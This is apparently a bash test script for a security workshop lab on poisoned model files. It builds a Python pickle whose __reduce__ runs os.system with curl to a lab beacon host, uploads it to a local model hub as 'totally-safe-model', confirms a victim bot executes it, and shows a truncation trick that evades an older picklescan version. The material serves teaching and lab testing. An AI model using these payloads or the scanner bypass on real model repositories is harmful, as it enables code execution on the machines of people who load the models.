#!/usr/bin/env bash
# ===========================================================================
# GATE 3 — walk Workshop 2 as an attendee, through the proxy.
#
# The real gate is exercises 1 -> 2: build a poisoned pickle, scan it, upload
# it to the hub, and confirm the victim bot loads it and a beacon lands on the
# scoreboard attributed to your team. Everything else in Workshop 2 is a
# variation on that loop.
#
# Usage:  bash scripts/gate3_workshop2.sh [base-url]     default http://localhost
# ===========================================================================
set -uo pipefail
BASE="${1:-http://localhost}"
# URL the PAYLOAD uses — it executes inside the victim container, where the
# nginx alias makes northwind.local resolve. Override for a real second-device run.
PAYLOAD_BASE="${PAYLOAD_BASE:-http://northwind.local}"
TEAM="G3-$(date +%H%M%S)"
PY="${PY:-python3}"
pass=0; fail=0

ok()  { printf "  \033[32mPASS\033[0m  %s\n" "$*"; pass=$((pass+1)); }
bad() { printf "  \033[31mFAIL\033[0m  %s\n" "$*"; fail=$((fail+1)); }
say() { printf "\n\033[1;36m==> %s\033[0m\n" "$*"; }
code(){ curl -s -o /dev/null -w '%{http_code}' --max-time 8 "$1"; }

say "Target $BASE   payload->$PAYLOAD_BASE   team $TEAM"

# --- health --------------------------------------------------------------
say "Health sweep"
for p in /health /hub/health /feed /scan/health; do
  c=$(code "$BASE$p")
  [ "$c" = "200" ] && ok "$p" || bad "$p -> $c"
done

# --- exercise 1: the file is code ----------------------------------------
say "Exercise 1 — build a poisoned pickle, scan it"
WORK=$(mktemp -d); trap 'rm -rf "$WORK"' EXIT

"$PY" - "$WORK" "$TEAM" "$PAYLOAD_BASE" <<'PYEOF'
import base64, json, pathlib, pickle, struct, sys
work, team, base = pathlib.Path(sys.argv[1]), sys.argv[2], sys.argv[3]

class Evil:
    def __reduce__(self):
        import os
        return (os.system, (f"curl -s '{base}/pwned?team={team}&level=1' >/dev/null 2>&1",))

shipped = work / "shipped"; shipped.mkdir()
(shipped / "pytorch_model.bin").write_bytes(pickle.dumps(Evil(), protocol=2))
(shipped / "config.json").write_text(json.dumps({"model_type": "llama"}))

clean = work / "clean"; clean.mkdir()
tensor = b"\x00" * 16
head = json.dumps({"weight": {"dtype":"F32","shape":[2,2],"data_offsets":[0,16]}}).encode()
(clean / "model.safetensors").write_bytes(struct.pack("<Q", len(head)) + head + tensor)
print("built")
PYEOF

scan_verdict() {  # $1 = file path
  local blob; blob=$($PY -c "import base64,sys;print(base64.b64encode(open(sys.argv[1],'rb').read()).decode())" "$1")
  curl -s --max-time 20 -X POST "$BASE/scan" -H 'Content-Type: application/json' \
    -d "{\"team\":\"$TEAM\",\"file\":\"$blob\"}"
}

R=$(scan_verdict "$WORK/shipped/pytorch_model.bin")
echo "$R" | grep -q '"verdict":"flagged"' && ok "poisoned pickle -> flagged" \
  || bad "poisoned pickle verdict: $(echo "$R" | head -c 160)"
echo "$R" | grep -q '"posix"' && ok "picklescan named the dangerous global (posix.system)" \
  || bad "no dangerous global reported"
echo "$R" | grep -q '"scanned_as":".pkl"' && \
  ok "bare pickle sniffed and handed to modelscan as .pkl" \
  || bad "content sniff did not rename the bare pickle" 

R=$(scan_verdict "$WORK/clean/model.safetensors")
echo "$R" | grep -q '"verdict":"clean"' && ok "safetensors -> clean" \
  || bad "safetensors verdict: $(echo "$R" | head -c 160)"
echo "$R" | grep -q '"detected_as":"safetensors"' && ok "format sniffed as safetensors" \
  || bad "format sniff wrong"

# --- exercise 2: ship it -------------------------------------------------
say "Exercise 2 — upload to the hub"
BODY=$("$PY" - "$WORK/shipped" "$TEAM" <<'PYEOF'
import base64, json, pathlib, sys
d, team = pathlib.Path(sys.argv[1]), sys.argv[2]
files = {p.name: base64.b64encode(p.read_bytes()).decode() for p in d.iterdir() if p.is_file()}
print(json.dumps({"team": team, "repo": "totally-safe-model", "files": files}))
PYEOF
)
UP=$(curl -s --max-time 30 -X POST "$BASE/hub/api/upload" \
     -H 'Content-Type: application/json' -d "$BODY")
echo "$UP" | grep -q '"ok":true' && ok "upload accepted" || bad "upload: $(echo "$UP" | head -c 200)"

[ "$(code "$BASE/hub/api/models/$TEAM/totally-safe-model")" = "200" ] \
  && ok "repo servable via HF API" || bad "repo not servable"
[ "$(code "$BASE/hub/$TEAM/totally-safe-model")" = "200" ] \
  && ok "model card renders" || bad "model card missing"

# --- the gate: victim loads it, beacon lands -----------------------------
say "Victim bot picks it up (polls every 20s — waiting up to 75s)"
GOT=0
for i in $(seq 1 25); do
  if curl -s --max-time 6 "$BASE/feed?limit=200" | grep -q "$TEAM"; then GOT=1; break; fi
  sleep 3
done
if [ $GOT = 1 ]; then
  ok "BEACON LANDED — victim executed the payload"
else
  bad "no beacon after 75s"
  echo "     victim log tail:"; docker compose logs victim --tail=12 2>&1 | sed 's/^/     /'
fi

curl -s --max-time 6 "$BASE/scores" | grep -q "$TEAM" \
  && ok "team is on the scoreboard" || bad "team not on scoreboard"

# --- exercises 3, 4, 6, 7 ------------------------------------------------
say "Exercises 3, 4, 6, 7"
"$PY" - "$BASE" "$TEAM" <<'PYEOF' || fail=$((fail+1))
import base64, json, pickle, sys, time, urllib.request
BASE, TEAM = sys.argv[1], sys.argv[2]
ok=lambda m: print(f"  \033[32mPASS\033[0m  {m}")
bad=lambda m: (print(f"  \033[31mFAIL\033[0m  {m}"), fails.append(m))
fails=[]

class P:
    def __reduce__(self):
        return (urllib.request.urlopen, (f"http://northwind.local/pwned?team={TEAM}&level=4a",))

def post(path, obj, t=45):
    r=urllib.request.Request(f"{BASE}{path}", data=json.dumps(obj).encode(),
                             headers={"Content-Type":"application/json"})
    return json.load(urllib.request.urlopen(r, timeout=t))
def scan(b): return post("/scan", {"team":TEAM,"file":base64.b64encode(b).decode()})

full  = pickle.dumps(P())
trunc = pickle.dumps(P(), protocol=2)[:-1]

r=scan(full)
(ok if r["verdict"]=="flagged" else bad)(f"ex3 full pickle -> {r['verdict']} on v{r['scanner_version']} (must be flagged)")
r=scan(trunc)
(ok if r["verdict"]=="clean" else bad)(f"ex4A truncation bypasses v{r['scanner_version']} -> {r['verdict']} (must be clean)")

up=post("/scan/upgrade", {"team":TEAM})
(ok if up["now"]!=up["was"] else bad)(f"/scan/upgrade  picklescan {up['was']} -> {up['now']}")
r=scan(trunc)
(ok if r["verdict"]=="flagged" else bad)(f"ex4A caught after upgrade -> {r['verdict']} on v{r['scanner_version']}")
r=post("/scan", {"team":"BYSTANDER","file":base64.b64encode(trunc).decode()})
(ok if r["scanner_version"].startswith("0.0") else bad)(f"upgrade is per-team (bystander still on v{r['scanner_version']})")

# ex6 victim log
post("/hub/api/upload", {"team":TEAM,"repo":"loud","files":{"pytorch_model.bin":base64.b64encode(trunc).decode()}})
entry=None
for _ in range(30):
    time.sleep(3)
    log=json.load(urllib.request.urlopen(f"{BASE}/victim/log?team={TEAM}", timeout=10))
    if log: entry=log[-1]; break
if entry and all(k in entry for k in ("time","status","duration_ms")):
    ok(f"ex6 /victim/log  status={entry['status']} {entry['duration_ms']}ms level={entry['level']}")
else:
    bad("ex6 /victim/log produced no usable entry")

td=json.load(urllib.request.urlopen(f"{BASE}/teardown?team={TEAM}", timeout=10))
(ok if td.get("ok") else bad)(f"ex7 /teardown -> purged {td.get('uploads_purged')} repo(s)")
sys.exit(1 if fails else 0)
PYEOF

# --- verdict -------------------------------------------------------------
echo; printf -- "----------------------------------------------\n"
if [ $fail -eq 0 ]; then
  printf "\033[1;32m  GATE 3 PASSED  —  %d checks\033[0m\n" "$pass"
  printf "  Workshop 2's core loop works end to end.\n"
else
  printf "\033[1;31m  GATE 3 FAILED  —  %d passed, %d failed\033[0m\n" "$pass" "$fail"
fi
printf -- "----------------------------------------------\n"
exit $((fail > 0))
